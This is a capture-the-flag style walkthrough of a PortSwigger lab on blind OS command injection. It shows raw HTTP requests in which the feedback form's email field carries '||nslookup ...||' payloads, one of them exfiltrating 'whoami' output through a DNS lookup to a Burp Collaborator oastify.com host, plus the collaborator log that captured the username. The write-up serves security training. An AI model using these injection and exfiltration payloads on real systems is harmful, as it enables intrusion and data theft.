## Blind OS command injection with out-of-band data exfiltration

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.

Note :

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

## Notes

- /feedback


## Resume

1. Capture a `/feedback` request
2. Inject OS command payload
3. Execute a `whoami` and extract it over burp collaborator

## Solve 

First step is to capture a `/feedback` request : 

```
POST /feedback/submit HTTP/2
Host: 0a4700b80487cb0581e5f383009f0017.web-security-academy.net
Cookie: session=pPDbwfwE5bWXI5NBpsa4d8bLg0jOu623
Content-Length: 95
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a3f0091038921ea80d8b3f600e700ef.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a3f0091038921ea80d8b3f600e700ef.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

csrf=C0bAhjHRnXO4nVKVqlKobpW3XyuPtWoA&name=toto&email=toto%40toto.com&subject=toto&message=toto
```

Then try to RCE on one of the two parameters : 

```
POST /feedback/submit HTTP/2
Host: 0a4700b80487cb0581e5f383009f0017.web-security-academy.net
Cookie: session=pPDbwfwE5bWXI5NBpsa4d8bLg0jOu623
Content-Length: 95
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a3f0091038921ea80d8b3f600e700ef.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a3f0091038921ea80d8b3f600e700ef.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

csrf=4AKJYdIoHnZ5Tp2PR45PBbk40NgXQ2ju&name=toto&email=toto%40toto.com||nslookup fwfpw44iivjmg5i9klno5vz19sfj3br0.oastify.com||&subject=toto&message=toto
```

The answer : 

```
HTTP/2 500 Internal Server Error
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 16

"Could not save"
```

We can see that on our collaborator we have two **DNS** request that confirm we were able to **RCE** with OOB interaction. We now have to update the request to exfiltrate via **DNS** the answer from a **whoami** command.

```
POST /feedback/submit HTTP/2
Host: 0a4700b80487cb0581e5f383009f0017.web-security-academy.net
Cookie: session=pPDbwfwE5bWXI5NBpsa4d8bLg0jOu623
Content-Length: 95
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a3f0091038921ea80d8b3f600e700ef.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a3f0091038921ea80d8b3f600e700ef.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

csrf=4AKJYdIoHnZ5Tp2PR45PBbk40NgXQ2ju&name=toto&email=toto%40toto.com||nslookup `whoami`.jtgtt81mfzgqd9fdhpks2zw56wcn0go5.oastify.com||&subject=toto&message=toto
```

And on the collaborator : 

```
peter-bVNY3h jtgtt81mfzgqd9fdhpks2zw56wcn0go5oastifycom
```